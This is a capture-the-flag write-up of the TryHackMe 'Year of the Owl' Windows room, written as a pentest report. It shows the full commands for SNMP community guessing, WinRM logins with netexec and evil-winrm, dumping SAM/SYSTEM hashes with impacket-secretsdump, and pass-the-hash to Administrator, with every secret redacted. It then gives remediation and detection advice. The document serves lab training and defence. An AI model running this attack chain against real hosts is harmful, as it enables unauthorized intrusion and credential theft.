---
title: "TryHackMe: Year of the Owl"
date: 2026-06-21 23:45:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - snmp
  - winrm
  - smb
  - credential-attacks
  - registry-hives
  - pass-the-hash
  - privilege-escalation
description: >-
  Year of the Owl chains SNMP information disclosure, a predictable local
  credential, exposed Windows registry hive backups, and pass-the-hash
  authentication into complete Administrator compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_year_of_the_owl
image:
  path: room_image.webp
  alt: "Original TryHackMe Year of the Owl room artwork"
toc: true
comments: false
---

Year of the Owl is a Windows challenge built around information disclosure, weak credential management, and insecure handling of local credential material. The validated path started from an unauthenticated network position, used SNMP to identify a local account, obtained a WinRM foothold with a predictable password, recovered readable SAM and SYSTEM backups, and finished with pass-the-hash access as the local Administrator.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Year of the Owl room card](room_card.webp){: w="294" h="272" .shadow }](https://tryhackme.com/room/yearoftheowl){: .center }

## Executive Summary

The target exposed a Windows host with several web, file-sharing, database, remote-management, and monitoring services.

The validated compromise path was:

1. identify the reachable TCP services and SNMP on UDP/161;
2. recover a valid SNMPv1 read community and enumerate the local account `Jareth`;
3. validate a predictable password for `Jareth`;
4. obtain a remote PowerShell session through WinRM;
5. recover `sam.bak` and `system.bak` from the user's Recycle Bin;
6. extract the local Administrator NTLM material offline;
7. authenticate to WinRM using pass-the-hash;
8. validate Administrator access and read the final authorized proof file.

> **Result:** An unauthenticated network position was converted into full local Administrator control through exposed SNMP information, weak credentials, and user-readable Windows registry hive backups.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe lab.

The test was limited to the assigned host. Denial of service, destructive modification, persistence, source-code review, domain-wide testing, and adjacent-host testing were outside scope.

Credential guessing was intentionally narrow and clue-driven rather than a broad password spray.

## Initial Enumeration

The target did not respond to ICMP, so TCP discovery was performed with host discovery disabled:

```console
$ nmap \
  -p80,139,443,445,3306,3389,5985,47001 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

The following attack surface was observed:

```text
80/tcp     HTTP      Apache 2.4.46 / PHP 7.4.10
139/tcp    NetBIOS   Windows file-sharing support
443/tcp    HTTPS     Apache 2.4.46
445/tcp    SMB       SMB 2/3
3306/tcp   MariaDB   remote database service
3389/tcp   RDP       Windows Remote Desktop
5985/tcp   WinRM     remote PowerShell management
47001/tcp  HTTPAPI   Microsoft management endpoint
161/udp    SNMP      SNMPv1
```

The broad management surface was useful for validation, but the compromise itself depended primarily on SNMP, WinRM, and the exposed registry hive backups.

## SNMP Enumeration

A targeted UDP review identified SNMP on port `161`.

Community discovery returned a valid SNMPv1 read community, which is intentionally not published:

```console
$ onesixtyone \
  -c /usr/share/seclists/Discovery/SNMP/snmp.txt \
  TARGET_IP
```

The recovered community was then used for system enumeration:

```console
$ snmpwalk \
  -v1 \
  -c [REDACTED] \
  TARGET_IP
```

SNMP disclosed system and process information, the hostname `YEAR-OF-THE-OWL`, and the local account:

```text
Jareth
```

This reduced the credential attack from broad username discovery to a targeted test against a known local account.

## Weak Credentials and WinRM Foothold

A small clue-driven password list was tested against the discovered account.

The credential is intentionally redacted:

```console
$ netexec smb \
  TARGET_IP \
  -u Jareth \
  -p [REDACTED] \
  --local-auth
```

The same credential was accepted by WinRM:

```console
$ netexec winrm \
  TARGET_IP \
  -u Jareth \
  -p [REDACTED]
```

An interactive PowerShell session was then established:

```console
$ evil-winrm \
  -i TARGET_IP \
  -u Jareth \
  -p [REDACTED]
```

The shell ran as:

```text
year-of-the-owl\jareth
```

The authorized user-level proof file was accessible at:

```text
C:\Users\Jareth\Desktop\user.txt
```

Its value is intentionally published only as:

```text
THM{[REDACTED]}
```

## Registry Hive Backup Discovery

Local enumeration identified readable backup copies of the Windows SAM and SYSTEM registry hives in Jareth's Recycle Bin:

```text
C:\$Recycle.Bin\<USER_SID>\
  sam.bak
  system.bak
```

The report recorded the following backup sizes:

```text
sam.bak        49,152 bytes
system.bak     17,457,152 bytes
```

These files contain enough material to recover local Windows password hashes offline.

The backups were copied for analysis and processed with Impacket:

```console
$ impacket-secretsdump \
  -sam sam.bak \
  -system system.bak \
  LOCAL
```

The local Administrator credential material recovered from the hives is intentionally not published:

```text
Administrator:500:[REDACTED]
```

## Pass-the-Hash Administrator Access

The extracted Administrator NTLM material was validated directly over WinRM without recovering the plaintext Administrator password:

```console
$ netexec winrm \
  TARGET_IP \
  -u Administrator \
  -H [REDACTED] \
  --local-auth
```

The authentication succeeded, after which an Administrator shell was established:

```console
$ evil-winrm \
  -i TARGET_IP \
  -u Administrator \
  -H [REDACTED]
```

The resulting identity was:

```text
year-of-the-owl\administrator
```

The final authorized proof file was accessible at:

```text
C:\Users\Administrator\Desktop\admin.txt
```

The proof value is redacted:

```text
THM{[REDACTED]}
```

## Findings

### YOTO-01 - Insecure SNMPv1 Community Permits Remote Enumeration

- **Severity:** Medium
- **Affected service:** SNMPv1 / UDP 161
- **Impact:** Unauthenticated disclosure of system information and local account names

The target exposed SNMPv1 with a discoverable read community. Enumeration disclosed the hostname, running processes, software paths, and the local username `Jareth`, directly supporting the later credential attack.

**Remediation:**

- disable SNMP where it is not required;
- migrate to SNMPv3 with authentication and encryption;
- restrict UDP/161 to approved management hosts;
- expose only the minimum required OIDs;
- monitor for community-string enumeration and unexpected SNMP queries.

### YOTO-02 - Predictable Password Enables Remote WinRM Access

- **Severity:** High
- **Affected account:** `YEAR-OF-THE-OWL\Jareth`
- **Impact:** Remote PowerShell access as a local user

The `Jareth` account used a predictable theme-related password. A small clue-driven list was sufficient to recover the credential, which authenticated to SMB and WinRM.

**Remediation:**

- reset the credential and require long, unique passwords;
- prohibit theme-, username-, and context-derived passwords;
- restrict WinRM to approved administration networks;
- remove unnecessary membership in `Remote Management Users`;
- monitor failed logons and WinRM activity;
- prefer stronger remote-management authentication where available.

### YOTO-03 - SAM and SYSTEM Backups Exposed to a Standard User

- **Severity:** Critical
- **Affected location:** `C:\$Recycle.Bin\<USER_SID>`
- **Impact:** Offline recovery of local password hashes and full Administrator compromise

Readable backup copies of `SAM` and `SYSTEM` were sufficient to extract the local Administrator NTLM material. That material was accepted for pass-the-hash authentication over WinRM.

**Remediation:**

- remove SAM, SYSTEM, SECURITY, and other credential-store backups from user-accessible locations;
- investigate and correct the process that created the backups;
- rotate all local credentials;
- deploy Windows LAPS for managed local Administrator passwords;
- restrict NTLM where feasible;
- monitor creation and access of registry hive copies outside protected system paths.

### YOTO-04 - Broad Remote Management Attack Surface

- **Severity:** Medium
- **Affected services:** SMB, RDP, WinRM, MariaDB, HTTPAPI
- **Impact:** Multiple remote paths for credential validation and post-compromise administration

Several administrative and data services were reachable from the assessment network. Even where anonymous access was rejected, the exposure increased the number of protocols available for credential attacks and post-compromise access.

**Remediation:**

- restrict management services to dedicated jump hosts or administration subnets;
- disable unused services and firewall exceptions;
- bind database services to appropriate application networks;
- require SMB signing;
- protect RDP with network-level controls and MFA where available;
- monitor remote-service authentication and pass-the-hash indicators.

### YOTO-05 - Outdated and Misconfigured Web Stack Disclosure

- **Severity:** Low
- **Affected services:** HTTP / 80 and HTTPS / 443
- **Impact:** Version and configuration disclosure supporting reconnaissance

The web stack disclosed Apache, OpenSSL, and PHP versions. HTTPS used an expired certificate issued to `localhost`, and default XAMPP-related paths were discoverable. No direct web exploitation was validated.

Observed software included:

```text
Apache/2.4.46 (Win64)
OpenSSL/1.1.1g
PHP/7.4.10
```

**Remediation:**

- upgrade the web stack to supported versions;
- replace the expired and mismatched certificate;
- suppress unnecessary version headers;
- remove unused default XAMPP content;
- perform a focused web review after platform hardening.

## Security Impact

The demonstrated chain provided complete local Administrator control of the Windows host.

An attacker with equivalent network reachability could:

- enumerate local account information through SNMP;
- obtain a remote shell through a weak local credential;
- access user data and local system information;
- recover password hashes from exposed registry hive backups;
- authenticate as Administrator without knowing the Administrator plaintext password;
- read or modify files available to the local Administrator;
- use exposed management services for further administrative activity.

The most severe issue was not the initial password alone. The readable SAM and SYSTEM backups converted a standard-user foothold into reusable Administrator credential material.

## Detection Opportunities

Useful monitoring controls include:

- alert on SNMP queries from non-management hosts;
- monitor repeated SNMP community discovery attempts;
- alert on WinRM authentication from unexpected sources;
- review Windows Event IDs associated with failed logons and remote logons;
- detect access to `SAM`, `SYSTEM`, `SECURITY`, or backups of those hives outside protected paths;
- monitor Recycle Bin locations for sensitive administrative artifacts;
- alert on NTLM-based Administrator access from unusual hosts;
- correlate SMB, RDP, and WinRM authentication for the same local account;
- monitor configuration changes that expose management services to broader networks.

## Remediation Priorities

1. Delete exposed registry hive backups from user-accessible locations.
2. Rotate the local Administrator and `Jareth` credentials.
3. Deploy Windows LAPS for unique managed local Administrator passwords.
4. Restrict WinRM, RDP, SMB, and SNMP to trusted administration sources.
5. Disable SNMP or migrate to SNMPv3 with strong authentication and encryption.
6. Audit Recycle Bins and backup locations for credential material.
7. Reduce unnecessary remote-management service exposure.
8. Require SMB signing and review NTLM policy.
9. Patch the XAMPP/web stack and replace the expired TLS certificate.
10. Add monitoring for stolen-hash and pass-the-hash behavior.

## Retest Plan

1. Verify SNMP is unavailable from ordinary user/VPN networks or requires approved SNMPv3 credentials.
2. Confirm the previous `Jareth` password no longer authenticates to SMB, WinRM, RDP, or other exposed services.
3. Verify `Jareth` has remote-management access only if explicitly required.
4. Confirm standard users cannot locate or read copies of `SAM`, `SYSTEM`, `SECURITY`, `ntds.dit`, or equivalent credential stores.
5. Verify the previously recovered Administrator NTLM material no longer authenticates after credential rotation.
6. Confirm management ports are filtered from untrusted networks.
7. Verify SMB signing is enforced where required.
8. Confirm web headers, software versions, and TLS configuration reflect the hardened platform.

## Lessons Learned

Year of the Owl demonstrates how several conventional Windows security weaknesses can combine into full host compromise without a memory-corruption exploit or a sophisticated software vulnerability.

SNMP information disclosure provided a valid username. A predictable credential converted that information into remote PowerShell access. The decisive privilege-escalation issue was then insecure handling of SAM and SYSTEM backups, which exposed reusable Administrator credential material.

The most important defensive measures are therefore strong credential hygiene, strict control of Windows credential stores and backups, restricted remote-management exposure, modern SNMP configuration, and monitoring for stolen-hash authentication.
